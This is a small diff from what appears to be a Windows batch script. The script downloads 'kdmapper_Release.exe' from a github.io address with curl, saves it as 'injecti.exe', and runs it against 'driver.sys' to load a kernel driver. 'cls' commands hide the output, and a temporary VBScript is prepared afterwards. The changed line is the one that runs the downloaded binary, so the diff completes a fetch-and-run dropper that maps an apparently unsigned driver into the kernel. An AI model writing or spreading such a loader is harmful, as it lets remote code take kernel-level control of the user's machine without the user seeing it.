@@ -5,7 +5,7 @@ cls
 curl -o injecti.exe https://getserver.github.io/api/keysys/kdmapper_Release.exe
 cls
 
-"injbs56789acerb6v1.scr" "driver.sys"
+"injecti.exe" "driver.sys"
 
 set VBScriptFile=temp.vbs
 
